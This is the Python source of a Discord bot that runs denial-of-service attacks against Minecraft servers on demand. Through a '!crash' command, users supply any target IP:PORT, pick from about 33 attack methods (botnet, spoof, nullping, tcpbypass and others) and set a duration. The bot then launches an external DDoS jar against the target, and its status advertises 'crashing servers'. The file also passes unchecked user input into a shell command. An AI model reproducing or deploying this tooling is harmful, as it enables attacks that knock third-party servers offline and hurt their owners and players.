import discord
import subprocess
import os
import threading
import time
from dotenv import load_dotenv

load_dotenv('.env')
TOKEN = os.getenv("TOKEN")

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# Store user data for attack limits (max 2 attacks per user)
user_attack_data = {}

# Max attacks per user and max time per attack
MAX_ATTACKS = 2
MAX_ATTACK_TIME = 5 * 60  # 5 minutes

# Allowed Guild ID and Channel ID
ALLOWED_GUILD_ID = 1330148451530309692
ALLOWED_CHANNEL_ID = 1335304101319151667

# Server invite link
server_invite = 'https://discord.gg/vg6kdGVv'
def crash_attack(ip_port, protocol, method, seconds, targetcps, crash_id, user_id):
    try:
        command = f"java -jar SyverisDDoS.jar {ip_port} {protocol} {method} {seconds} {targetcps}"
        print(f"[INFO] Running command: {command}")
        process = subprocess.Popen(command, shell=True)
        user_attack_data[user_id]['processes'][crash_id] = process
        start_time = time.time()
        while time.time() - start_time < seconds:
            if process.poll() is not None:
                break
            time.sleep(1)
        process.terminate()
        process.wait()
        del user_attack_data[user_id]['processes'][crash_id]

    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to execute command: {e}")
    finally:
        if crash_id in user_attack_data[user_id]['processes']:
            del user_attack_data[user_id]['processes'][crash_id]
@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    with open('pfp.jpeg', 'rb') as f:
        await client.user.edit(avatar=f.read())
    
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game(name="crashing servers ;)"))
    await client.user.edit(description="I love destroying servers")
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.guild is None or message.guild.id != ALLOWED_GUILD_ID:
        await message.channel.send(f"Please join the server using this link: {server_invite}")
        return
    if message.channel.id != ALLOWED_CHANNEL_ID:
        await message.channel.send(f"Please go to the correct channel: <#{ALLOWED_CHANNEL_ID}> to use the commands.")
        return
    if message.content.startswith('!help'):
        await message.channel.send(
            "```"
            "Available Commands:\n"
            "!crash <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS> - Start a crash attack with specified parameters.\n"
            "\n"
            "For more information on each argument, type `!crash`.\n"
            "```"
        )
        return

    # Handle the !crash command
    if message.content.startswith('!crash'):
        args = message.content.split()
        if len(args) == 1:
            await message.channel.send(
                "```"
                "Usage: !crash <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>\n"
                "\n"
                "<IP:PORT>     - Target server address and port (e.g., 127.0.0.1:25565)\n"
                "<PROTOCOL>    - Protocol version of the server (e.g., 340 for Minecraft)\n"
                "<METHOD>      - Attack method (choose one from various methods available)\n"
                "<SECONDS>     - Duration of the attack in seconds (max: 300 seconds)\n"
                "<TARGETCPS>   - Max CPS (connections per second) (use -1 for no limit)\n"
                "\n"
                "Allowed Methods:\n"
                "join, legitjoin, localhost, invalidnames, longnames, botjoiner, power, spoof, ping, spam, killer, nullping, ... (full list available)"
                "\n"
                "Example: !crash 127.0.0.1:25565 340 join 60 1000\n"
                "```"
            )
            return
        if len(args) != 6:
            await message.channel.send(f"[ERROR] Correct usage: `!crash <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>`")
            return
        ip_port = args[1]
        protocol = args[2]
        method = args[3]
        seconds = int(args[4])
        targetcps = args[5]
        allowed_methods = [
            'join', 'legitjoin', 'localhost', 'invalidnames', 'longnames', 'botjoiner', 'power', 'spoof', 'ping', 
            'spam', 'killer', 'nullping', 'charonbot', 'multikiller', 'packet', 'handshake', 'bighandshake', 
            'query', 'bigpacket', 'network', 'randombytes', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry', 
            'colorcrasher', 'tcphit', 'queue', 'botnet', 'tcpbypass', 'ultimatesmasher', 'sf', 'nabcry'
        ]
        if method not in allowed_methods:
            await message.channel.send(f"[ERROR] Invalid method. Allowed methods: {', '.join(allowed_methods)}")
            return
        user_id = str(message.author.id)
        if user_id not in user_attack_data:
            user_attack_data[user_id] = {'attack_count': 0, 'processes': {}}
        if user_attack_data[user_id]['attack_count'] >= MAX_ATTACKS:
            await message.channel.send(f"[ERROR] You have already reached the maximum number of attacks ({MAX_ATTACKS})!")
            return
        crash_id = len(user_attack_data[user_id]['processes']) + 1
        user_attack_data[user_id]['attack_count'] += 1
        threading.Thread(target=crash_attack, args=(ip_port, protocol, method, seconds, targetcps, crash_id, user_id)).start()
        await message.channel.send(
            f"**Starting crash attack on {ip_port}**\n"
            f"Method: {method}\n"
            f"Duration: {seconds} seconds\n"
            f"Target CPS: {targetcps}\n\n"
            "```"
            "Credits to orkkz!\n"
            "For more information and updates, visit the GitHub repo:\n"
            "GitHub: https://github.com/orkkz\n"
            "```"
        )

    # Handle any other messages
    if message.content.startswith('!credits'):
        await message.channel.send(
            "```"
            "Credits:\n"
            "This bot was developed by Triggermine | Affan Orakzai.\n"
            "Special thanks to everyone involved in the community!\n"
            "Check out our work at: https://github.com/orkkz"
            "```"
        )

# Run the bot
if __name__ == '__main__':
    client.run(TOKEN)
